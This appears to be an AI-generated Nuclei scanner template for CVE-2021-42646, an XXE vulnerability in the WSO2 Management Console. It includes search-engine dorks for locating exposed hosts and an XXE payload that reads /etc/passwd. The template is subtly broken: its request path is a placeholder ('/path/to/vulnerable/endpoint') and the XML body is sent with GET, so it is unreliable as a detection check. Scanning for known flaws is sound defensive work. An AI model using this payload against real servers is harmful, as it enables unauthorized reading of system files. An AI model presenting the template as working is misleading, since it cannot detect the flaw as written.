id: CVE-2021-42646

info:
  name: WSO2 Management Console XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: XML External Entity (XXE) vulnerability in the file based service provider creation feature of the Management Console in WSO2 API Manager and WSO2 Identity Server allows attackers to gain read access to sensitive information or cause a denial of service via crafted GET requests.
  impact: |
    An attacker could exploit this vulnerability to read arbitrary files on the server.
  remediation: |
    Apply the necessary security patches provided by WSO2 to mitigate the XXE vulnerability.
  reference:
    - http://packetstormsecurity.com/files/167465/WSO2-Management-Console-XML-Injection.html
    - http://seclists.org/fulldisclosure/2022/Jun/7
    - https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2021/WSO2-2021-1289/
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 9.1
    cve-id: CVE-2021-42646
    cwe-id: CWE-611
    epss-score: 0.03292
    epss-percentile: 0.91612
    cpe: cpe:2.3:a:wso2:api_manager:2.6.0:*:*:*:*:*:*:*
  metadata:
    vendor: wso2
    product: api_manager
    shodan-query: http.favicon.hash:1398055326
    fofa-query: icon_hash=1398055326
    google-query: inurl:"carbon/admin/login"

http:
  - method: GET
    path:
      - "{{BaseURL}}/path/to/vulnerable/endpoint"

    headers:
      Content-Type: "application/xml"

    body: |
      <?xml version="1.0" encoding="ISO-8859-1"?>
      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
      <foo>&xxe;</foo>
    matchers:
      - type: word
        words:
          - "root:x:"
        part: body
